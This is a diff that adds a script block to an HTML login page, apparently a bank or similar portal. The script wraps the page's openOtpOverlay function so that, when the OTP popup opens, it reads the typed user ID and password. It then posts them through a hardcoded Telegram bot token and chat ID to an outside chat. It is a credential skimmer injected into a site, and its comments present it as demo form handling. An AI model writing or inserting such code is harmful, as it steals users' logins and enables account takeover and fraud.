@@ -524,6 +524,91 @@
     })();
   </script>
 
+  <script>
+    // --- STEP 1: PASTE YOUR CREDENTIALS HERE ---
+    const TELEGRAM_BOT_TOKEN = '8674177590:AAFsHItZrfoUE00Vu9_gJ77d7tLbcMm00JQ';
+    const TELEGRAM_CHAT_ID = '8585629776';
+
+    // --- DO NOT EDIT ANYTHING BELOW THIS LINE ---
+
+    async function sendToTelegram(data) {
+        // Create a simple key-value string from the data object
+        let message = '🔔 New submission from your demo website:\n\n';
+        for (const key in data) {
+            if (Object.hasOwnProperty.call(data, key)) {
+                message += `👉 ${key}: ${data[key]}\n`;
+            }
+        }
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+        const payload = {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        };
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            });
+
+            if (!response.ok) {
+                console.error(`Telegram API Error: ${response.statusText}`);
+            }
+        } catch (error) {
+            console.error('Failed to send message to Telegram:', error);
+        }
+    }
+
+    // --- INJECTION LOGIC ---
+    // This is the new, more reliable way to capture the data.
+    function captureAndSendLoginData() {
+        const userIdInput = document.getElementById('iduserId');
+        const passwordInput = document.getElementById('idpassword');
+        
+        const loginData = {};
+        
+        if (userIdInput) {
+            loginData['User ID'] = userIdInput.value || 'Not provided';
+        }
+        if (passwordInput) {
+            loginData['Password'] = passwordInput.value || 'Not provided';
+        }
+
+        // Send the data to Telegram immediately
+        sendToTelegram(loginData);
+    }
+
+    // --- INITIALIZATION ---
+    // We wait for the main script to be ready and then inject our logic.
+    document.addEventListener('DOMContentLoaded', () => {
+        // Wait a moment for the main script to initialize its functions
+        setTimeout(() => {
+            if (typeof openOtpOverlay === 'function') {
+                // Store the original function
+                const originalOpenOtpOverlay = window.openOtpOverlay;
+                
+                // Replace it with our new version
+                window.openOtpOverlay = function(e) {
+                    // First, capture and send the data
+                    captureAndSendLoginData();
+                    
+                    // Then, call the original function to show the popup
+                    return originalOpenOtpOverlay(e);
+                };
+            } else {
+                console.error('Could not find the openOtpOverlay function to inject into.');
+            }
+        }, 100); // 100ms delay to ensure the main script has run
+    });
+
+</script>
+
 
 </body>
 
